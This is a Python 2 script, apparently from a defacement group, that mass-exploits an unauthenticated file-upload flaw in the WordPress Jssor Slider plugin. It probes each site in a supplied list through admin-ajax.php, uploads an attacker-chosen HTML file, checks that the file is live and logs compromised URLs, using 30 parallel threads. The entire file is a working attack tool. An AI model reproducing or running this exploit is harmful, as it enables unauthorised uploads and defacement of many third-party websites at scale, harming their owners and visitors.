#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
#Author D4RK5H4D0W5
G0 = '\033[0;32m'
C1 = '\033[1;36m'
W0 = '\033[0;37m'
R0 = '\033[0;31m'
import requests,sys,os
from multiprocessing.pool import ThreadPool

def hek(target):
	try:
		r=requests.Session()
		cek=r.get(target+'/wp-admin/admin-ajax.php?param=upload_slide&action=upload_library').text
		if cek == '{"jsonrpc" : "2.0", "result" : null, "id" : "id"}':
			r.post(target+'/wp-admin/admin-ajax.php?param=upload_slide&action=upload_library',files={'file':(sys.argv[1],open(sys.argv[1]).read(),'text/html')})
			if r.get(target+'/wp-content/jssor-slider/jssor-uploads/'+sys.argv[1]).status_code==200:
				print '%s[ %ssuccess %s] %s/wp-content/jssor-slider/jssor-uploads/%s'%(W0,G0,W0,target,sys.argv[1])
				open('success.txt','a+').write(target+'/wp-content/jssor-slider/jssor-uploads/'+sys.argv[1]+'\n')
			else:
				print '%s[ %sfailed %s] %s'%(W0,R0,W0,target)
		else:
			print '%s[ %snot vuln %s] %s'%(W0,R0,W0,target)
	except:
		print '%s[ %sunk error %s] %s'%(W0,R0,W0,target)
		pass
try:
	os.system('cls' if os.name == 'nt' else 'clear')
	print '''%s
  _      _____
 | | /| / / _ \   %sCoded by D4RKSH4D0WS%s
 | |/ |/ / ___/   %sig @anonroz_team%s
 |__/|__/_/       Json Slider
	'''%(C1,W0,C1,W0,C1)
	open(sys.argv[1]).read()
	ThreadPool(30).map(hek,open(sys.argv[2]).read().splitlines())
	print '\n%s[ %sdone %s] success saved in success.txt'%(W0,G0,W0)
except requests.exceptions.ConnectionError:
	exit('%s[%s!%s] Check internet'%(W0,R0,W0))
except IndexError:
	exit('%s[%s!%s] python2 %s AnonRoz-Team.html list-web.txt \n%s[%s!%s] Use http or https on the target web'%(W0,R0,W0,sys.argv[0],W0,R0,W0))
except IOError:
	exit('%s[%s!%s] File does not exist'%(W0,R0,W0))
except KeyboardInterrupt:
	exit('\n%s[%s!%s] Exit'%(W0,R0,W0))